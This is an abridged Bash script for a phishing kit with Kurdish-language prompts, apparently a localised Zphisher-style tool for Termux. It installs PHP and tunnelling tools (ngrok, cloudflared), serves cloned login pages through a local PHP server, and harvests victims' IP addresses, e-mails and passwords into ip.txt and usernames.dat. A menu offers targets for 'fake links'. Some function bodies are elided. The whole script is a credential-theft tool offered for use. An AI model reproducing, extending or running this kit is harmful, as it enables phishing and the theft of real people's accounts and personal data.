...
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} barnamaka daxra." 2>&1; reset_color; }
    exit 0
}
...
banner() {
	cat <<- EOF
		${ORANGE}
     ${ORANGE}    __ ____  ______  ____  _________ __  __
     ${ORANGE}  / //_/ / / / __ \/ __ \/  _/ ___// / / /
     ${ORANGE} / ,< / / / / /_/ / / / // / \__ \/ /_/ /
     ${ORANGE}/ /| / /_/ / _, _/ /_/ // / ___/ / __  /
     ${ORANGE}/_/ |_\____/_/ |_/_____/___//____/_/ /_/
     ${ORANGE}
     ${ORANGE}   ________________  __  _____  ___  __
     ${ORANGE} /_  __/ ____/ __ \/  |/  / / / / |/ /
     ${ORANGE} / / / __/ / /_/ / /|_/ / / / /|   /
     ${ORANGE}  / / / /___/ _, _/ /  / / /_/ //   |
     ${ORANGE} /_/ /_____/_/ |_/_/  /_/\____//_/|_|
		 ${ORANGE}            ${RED}Version : 2.2

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by (TATALO)${WHITE}
	EOF
}
...
banner_small() {
	cat <<- EOF
		${BLUE}
    ${BLUE}        _   _   _   _   _   _   _     _   _   _   _   _   _
    ${BLUE}       / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ / \ / \
    ${BLUE}      ( K | U | R | D | I | S | H ) ( T | E | R | M | U | X )
    ${BLUE}       \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/${WHITE} BASHTRIN
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} damazrani packagea pewistakan..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} dmazrani package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} packageakan peshtr dmazrawn."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} dmazrani package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					...
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} package pshtgiri nakrawa."
					{ reset_color; exit 1; }
				fi
			}
		done
...
download_ngrok() {
	...
	if [[ -e "$file" ]]; then
		...
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} halla rweda la damazrani ngrok."
		{ reset_color; exit 1; }
	fi
}
...
download_cloudflared() {
	...
	if [[ -e "$file" ]]; then
		...
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} halla rweda la damazrani Cloudflared ."
		{ reset_color; exit 1; }
	fi
}
...
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} peshtr Ngrok damazrawa."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} damazrani ngrok..."${WHITE}
		arch=`uname -m`
...
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} peshtr Cloudflared damazrawa ."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} dmazrani Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} swpas bo bakar henani am tool.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
about() {
	...
	read -p "${RED}[${WHITE}-${RED}]${GREEN} danayek hallbzhera : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} garranawa bo sarata..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} hallaya dubara hawlla bda..."
			{ sleep 1; about; };;
	esac
}
...
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} damazrani server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} dast pekrdni PHP server..."${WHITE}
...
capture_ip() {
	...
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} code IP kasaka: ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} code IP xazn bu la : ${ORANGE}ip.txt"
...
capture_creds() {
	...
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} e-mail u password xazn bun la : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} chaware bka bo away kasaka zanyari daxil bka, ${BLUE}Ctrl + C ${ORANGE}bo darchun. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} chaware bka bo away kasak zanyari daxil bka, ${BLUE}Ctrl + C ${ORANGE}bo darchun..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} code IP kasaka dozrayawa !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} kasaka zanyari daxil krd !!"
			capture_creds
...
## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} dasti pekrd... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Ngrok dasti pekrd..."
...
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} dasti pekrd... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared dasti pekrd..."
...
tunnel_menu() {
	...
	case $REPLY in 
		...
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} hallaya dubara hawllbda..."
			{ sleep 1; tunnel_menu; };;
	esac
}
...
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} danayek hallbzhera bo badast henani linki saxta ${RED}[${WHITE}::${RED}]${ORANGE}
		...
		${RED}[${WHITE}99${RED}]${ORANGE} darbar         ${RED}[${WHITE}00${RED}]${ORANGE} darchun
